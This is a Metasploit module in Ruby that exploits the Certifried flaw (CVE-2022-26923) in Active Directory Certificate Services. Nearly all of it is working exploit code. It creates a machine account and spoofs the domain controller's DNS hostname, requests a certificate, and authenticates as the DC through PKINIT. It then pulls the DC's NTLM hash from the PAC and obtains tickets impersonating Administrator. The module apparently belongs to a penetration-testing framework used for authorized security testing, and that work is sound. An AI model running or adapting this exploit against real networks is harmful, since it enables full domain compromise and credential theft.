##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  alias connect_smb_client connect

  include Msf::Exploit::Remote::Kerberos::Client

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::MsIcpr
  include Msf::Exploit::Remote::MsSamr::Account

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Active Directory Certificate Services (ADCS) privilege escalation (Certifried)',
        'Description' => %q{
          This module exploits a privilege escalation vulnerability in Active
          Directory Certificate Services (ADCS) to generate a valid certificate
          impersonating the Domain Controller (DC) computer account. This
          certificate is then used to authenticate to the target as the DC
          account using PKINIT preauthentication mechanism. The module will get
          and cache the Ticket-Granting-Ticket (TGT) for this account along
          with its NTLM hash. Finally, it requests a TGS impersonating a
          privileged user (Administrator by default). This TGS can then be used
          by other modules or external tools.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Oliver Lyak', # Discovery
          'CravateRouge', # bloodyAD implementation
          'Erik Wynter', # MSF module
          'Christophe De La Fuente' # MSF module
        ],
        'References' => [
          ['URL', 'https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4'],
          ['URL', 'https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html'],
          ['CVE', '2022-26923']
        ],
        'Notes' => {
          'AKA' => [ 'Certifried' ],
          'Reliability' => [],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Actions' => [
          [ 'REQUEST_CERT', { 'Description' => 'Request a certificate with DNS host name matching the DC' } ],
          [ 'AUTHENTICATE', { 'Description' => 'Same as REQUEST_CERT but also authenticate' } ],
          [ 'PRIVESC', { 'Description' => 'Full privilege escalation attack' } ]
        ],
        'DefaultAction' => 'PRIVESC',
        'DefaultOptions' => {
          'RPORT' => 445,
          'SSL' => true,
          'DOMAIN' => ''
        }
      )
    )

    register_options([
      # Using USERNAME, PASSWORD and DOMAIN options defined by the LDAP mixin
      OptString.new('DC_NAME', [ true, 'Name of the domain controller being targeted (must match RHOST)' ]),
      OptInt.new('LDAP_PORT', [true, 'LDAP port (default is 389 and default encrypted is 636)', 636]), # Set to 636 for legacy SSL
      OptString.new('DOMAIN', [true, 'The Fully Qualified Domain Name (FQDN). Ex: mydomain.local']),
      OptString.new('USERNAME', [true, 'The username to authenticate with']),
      OptString.new('PASSWORD', [true, 'The password to authenticate with']),
      OptString.new(
        'SPN', [
          false,
          'The Service Principal Name used to request an additional impersonated TGS, format is "service_name/FQDN" '\
          '(e.g. "ldap/dc01.mydomain.local"). Note that, independently of this option, a TGS for "cifs/<DC_NAME>.<DOMAIN>"'\
          ' will always be requested.',
        ],
        conditions: %w[ACTION == PRIVESC]
      ),
      OptString.new(
        'IMPERSONATE', [
          true,
          'The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to request the ticket)',
          'Administrator'
        ],
        conditions: %w[ACTION == PRIVESC]
      )
    ])

    deregister_options('CERT_TEMPLATE', 'ALT_DNS', 'ALT_UPN', 'PFX', 'ON_BEHALF_OF', 'SMBUser', 'SMBPass', 'SMBDomain', 'LDAPUsername', 'LDAPPassword', 'LDAPDomain')
  end

  def run
    @privesc_success = false
    @computer_created = false

    opts = {}
    validate_options
    unless can_add_computer?
      fail_with(Failure::NoAccess, 'Machine account quota is zero, this user cannot create a computer account')
    end

    opts[:tree] = connect_smb
    computer_info = add_account(:computer, opts)
    @computer_created = true
    disconnect_smb(opts.delete(:tree))

    impersonate_dc(computer_info.name)

    opts = {
      username: computer_info.name,
      password: computer_info.password
    }
    opts[:tree] = connect_smb(opts)
    opts[:cert_template] = 'Machine'
    cert = request_certificate(opts)
    fail_with(Failure::UnexpectedReply, 'Unable to request the certificate.') unless cert

    if ['AUTHENTICATE', 'PRIVESC'].include?(action.name)
      credential, key = get_tgt(cert)
      fail_with(Failure::UnexpectedReply, 'Unable to request the TGT.') unless credential && key

      get_ntlm_hash(credential, key)
    end

    if action.name == 'PRIVESC'
      # Always request a TGS for `cifs/...` SPN, since we need it to properly delete the computer account
      default_spn = "cifs/#{datastore['DC_NAME']}.#{datastore['DOMAIN']}"
      request_ticket(credential, default_spn)
      @privesc_success = true

      # If requested, get an additional TGS
      if datastore['SPN'].present? && datastore['SPN'].casecmp(default_spn) != 0
        begin
          request_ticket(credential, datastore['SPN'])
        rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
          print_error("Unable to get the additional TGS for #{datastore['SPN']}: #{e.message}")
        end
      end
    end
  rescue MsSamrConnectionError, MsIcprConnectionError, SmbIpcConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue MsSamrAuthenticationError, MsIcprAuthenticationError, MsIcprAuthorizationError, SmbIpcAuthenticationError => e
    fail_with(Failure::NoAccess, e.message)
  rescue MsSamrNotFoundError, MsIcprNotFoundError => e
    fail_with(Failure::NotFound, e.message)
  rescue MsSamrBadConfigError => e
    fail_with(Failure::BadConfig, e.message)
  rescue MsSamrUnexpectedReplyError, MsIcprUnexpectedReplyError => e
    fail_with(Failure::UnexpectedReply, e.message)
  rescue MsSamrUnknownError, MsIcprUnknownError => e
    fail_with(Failure::Unknown, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::Unknown, e.message)
  ensure
    if @computer_created
      print_status("Deleting the computer account #{computer_info&.name}")
      disconnect_smb(opts.delete(:tree)) if opts[:tree]
      if @privesc_success
        # If the privilege escalation succeeded, let'use the cached TGS
        # impersonating the admin to delete the computer account
        datastore['SMB::Auth'] = Msf::Exploit::Remote::AuthOption::KERBEROS
        datastore['Smb::Rhostname'] = "#{datastore['DC_NAME']}.#{datastore['DOMAIN']}"
        datastore['SMBDomain'] = datastore['DOMAIN']
        datastore['DomainControllerRhost'] = rhost
        tree = connect_smb(username: datastore['IMPERSONATE'])
      else
        tree = connect_smb
      end
      opts = {
        tree: tree,
        account_name: computer_info&.name
      }
      begin
        delete_account(opts) if opts[:tree] && opts[:account_name]
      rescue MsSamrUnknownError => e
        print_warning("Unable to delete the computer account, this will have to be done manually with an Administrator account (#{e.message})")
      end
      disconnect_smb(opts.delete(:tree)) if opts[:tree]
    end
  end

  def validate_options
    if datastore['USERNAME'].blank?
      fail_with(Failure::BadConfig, 'USERNAME not set')
    end
    if datastore['PASSWORD'].blank?
      fail_with(Failure::BadConfig, 'PASSWORD not set')
    end
    if datastore['DOMAIN'].blank?
      fail_with(Failure::BadConfig, 'DOMAIN not set')
    end
    unless datastore['DOMAIN'].match(/.+\..+/)
      fail_with(Failure::BadConfig, 'DOMAIN format must be FQDN (ex: mydomain.local)')
    end
    if datastore['CA'].blank?
      fail_with(Failure::BadConfig, 'CA not set')
    end
    if datastore['DC_NAME'].blank?
      fail_with(Failure::BadConfig, 'DC_NAME not set')
    end
    if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+\..+\..+})
      fail_with(Failure::BadConfig, 'SPN format must be <service_name>/<hostname>.<FQDN> (ex: cifs/dc01.mydomain.local)')
    end
  end

  def connect_smb(opts = {})
    username = opts[:username] || datastore['USERNAME']
    password = opts[:password] || datastore['PASSWORD']
    domain = opts[:domain] || datastore['DOMAIN']
    datastore['SMBUser'] = username
    datastore['SMBPass'] = password
    datastore['SMBDomain'] = domain

    if datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
      vprint_status("Connecting SMB with #{username}.#{domain} using Kerberos authentication")
    else
      vprint_status("Connecting SMB with #{username}.#{domain}:#{password}")
    end
    begin
      connect_smb_client
    rescue Rex::ConnectionError, RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, e.message)
    end

    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e})")
    end
    report_service(
      host: rhost,
      port: rport,
      host_name: simple.client.default_name,
      proto: 'tcp',
      name: 'smb',
      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
    )

    begin
      simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e})")
    end
  end

  def disconnect_smb(tree)
    vprint_status('Disconnecting SMB')
    tree.disconnect! if tree
    simple.client.disconnect!
  rescue RubySMB::Error::RubySMBError => e
    print_warning("Unable to disconnect SMB ([#{e.class}] #{e})")
  end

  def can_add_computer?
    vprint_status('Requesting the ms-DS-MachineAccountQuota value to see if we can add any computer accounts...')

    quota = nil
    begin
      ldap_connection do |ldap|
        ldap_options = {
          filter: Net::LDAP::Filter.eq('objectclass', 'domainDNS'),
          attributes: 'ms-DS-MachineAccountQuota',
          return_result: false
        }
        ldap.search(ldap_options) do |entry|
          quota = entry['ms-ds-machineaccountquota']&.first&.to_i
        end
      end
    rescue Net::LDAP::Error => e
      print_error("LDAP error: #{e.class}: #{e.message}")
    end

    if quota.blank?
      print_warning('Received no result when trying to obtain ms-DS-MachineAccountQuota. Adding a computer account may not work.')
      return true
    end

    vprint_status("ms-DS-MachineAccountQuota = #{quota}")
    quota > 0
  end

  def print_ldap_error(ldap)
    opres = ldap.get_operation_result
    msg = "LDAP error #{opres.code}: #{opres.message}"
    unless opres.error_message.to_s.empty?
      msg += " - #{opres.error_message}"
    end
    print_error("#{peer} #{msg}")
  end

  def ldap_connection
    ldap_peer = "#{rhost}:#{datastore['LDAP_PORT']}"
    base = datastore['DOMAIN'].split('.').map { |dc| "dc=#{dc}" }.join(',')
    ldap_options = {
      port: datastore['LDAP_PORT'],
      base: base
    }

    ldap_connect(ldap_options) do |ldap|
      if ldap.get_operation_result.code != 0
        print_ldap_error(ldap)
        break
      end
      print_good("Successfully authenticated to LDAP (#{ldap_peer})")
      yield ldap
    end
  end

  def get_dnshostname(ldap, c_name)
    dnshostname = nil
    filter1 = Net::LDAP::Filter.eq('Name', c_name.delete_suffix('$'))
    filter2 = Net::LDAP::Filter.eq('objectclass', 'computer')
    joined_filter = Net::LDAP::Filter.join(filter1, filter2)
    ldap_options = {
      filter: joined_filter,
      attributes: 'DNSHostname',
      return_result: false

    }
    ldap.search(ldap_options) do |entry|
      dnshostname = entry[:dnshostname]&.first
    end
    vprint_status("Retrieved original DNSHostame #{dnshostname} for #{c_name}") if dnshostname
    dnshostname
  end

  def impersonate_dc(computer_name)
    ldap_connection do |ldap|
      dc_dnshostname = get_dnshostname(ldap, datastore['DC_NAME'])
      print_status("Attempting to set the DNS hostname for the computer #{computer_name} to the DNS hostname for the DC: #{datastore['DC_NAME']}")
      domain_to_ldif = datastore['DOMAIN'].split('.').map { |dc| "dc=#{dc}" }.join(',')
      computer_dn = "cn=#{computer_name.delete_suffix('$')},cn=computers,#{domain_to_ldif}"
      ldap.modify(dn: computer_dn, operations: [[ :add, :dnsHostName, dc_dnshostname ]])
      new_computer_hostname = get_dnshostname(ldap, computer_name)
      if new_computer_hostname != dc_dnshostname
        fail_with(Failure::Unknown, 'Failed to change the DNS hostname')
      end
      print_good('Successfully changed the DNS hostname')
    end
  rescue Net::LDAP::Error => e
    print_error("LDAP error: #{e.class}: #{e.message}")
  end

  def get_tgt(cert)
    dc_name = datastore['DC_NAME'].dup.downcase
    dc_name += '$' unless dc_name.ends_with?('$')
    username, realm = extract_user_and_realm(cert.certificate, dc_name, datastore['DOMAIN'])
    print_status("Attempting PKINIT login for #{username}@#{realm}")
    begin
      server_name = "krbtgt/#{realm}"
      tgt_result = send_request_tgt_pkinit(
        pfx: cert,
        client_name: username,
        realm: realm,
        server_name: server_name,
        rport: 88
      )
      print_good('Successfully authenticated with certificate')

      report_service(
        host: rhost,
        port: rport,
        name: 'Kerberos-PKINIT',
        proto: 'tcp',
        info: "Module: #{fullname}, Realm: #{realm}"
      )

      ccache = Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.from_responses(tgt_result.as_rep, tgt_result.decrypted_part)
      Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, host: rhost, framework_module: self)

      [ccache.credentials.first, tgt_result.krb_enc_key[:key]]
    rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
      case e.error_code
      when Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_CERTIFICATE_MISMATCH
        print_error("Failed: #{e.message}, Target system is likely not vulnerable to Certifried")
      else
        print_error("Failed: #{e.message}")
      end
      nil
    end
  end

  def get_ntlm_hash(credential, key)
    dc_name = datastore['DC_NAME'].dup.downcase
    dc_name += '$' unless dc_name.ends_with?('$')
    print_status("Trying to retrieve NT hash for #{dc_name}")

    realm = datastore['DOMAIN'].downcase

    authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(
      host: rhost,
      realm: realm,
      username: dc_name,
      framework: framework,
      framework_module: self
    )
    tgs_ticket, _tgs_auth = authenticator.u2uself(credential)

    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
      type: credential.keyblock.enctype.value,
      value: credential.keyblock.data.value
    )
    ticket_enc_part = Rex::Proto::Kerberos::Model::TicketEncPart.decode(
      tgs_ticket.enc_part.decrypt_asn1(session_key.value, Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET)
    )
    value = OpenSSL::ASN1.decode(ticket_enc_part.authorization_data.elements[0][:data]).value[0].value[1].value[0].value
    pac = Rex::Proto::Kerberos::Pac::Krb5Pac.read(value)
    pac_info_buffer = pac.pac_info_buffers.find do |buffer|
      buffer.ul_type == Rex::Proto::Kerberos::Pac::Krb5PacElementType::CREDENTIAL_INFORMATION
    end
    unless pac_info_buffer
      print_error('NTLM hash not found in PAC')
      return
    end

    serialized_pac_credential_data = pac_info_buffer.buffer.pac_element.decrypt_serialized_data(key)
    ntlm_hash = serialized_pac_credential_data.data.extract_ntlm_hash
    print_good("Found NTLM hash for #{dc_name}: #{ntlm_hash}")
    report_ntlm(realm, dc_name, ntlm_hash)
  end

  def report_ntlm(domain, user, hash)
    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :ntlm_hash,
      jtr_format: jtr_format,
      username: user,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: domain
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def request_ticket(credential, spn)
    print_status("Getting TGS impersonating #{datastore['IMPERSONATE']}@#{datastore['DOMAIN']} (SPN: #{spn})")

    dc_name = datastore['DC_NAME'].dup.downcase
    dc_name += '$' if !dc_name.ends_with?('$')

    options = {
      host: rhost,
      realm: datastore['DOMAIN'],
      username: dc_name,
      framework: framework,
      framework_module: self
    }

    authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)

    sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
      name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
      name_string: spn.split('/')
    )
    auth_options = {
      sname: sname,
      impersonate: datastore['IMPERSONATE']
    }
    authenticator.s4u2self(credential, auth_options)
  end

end
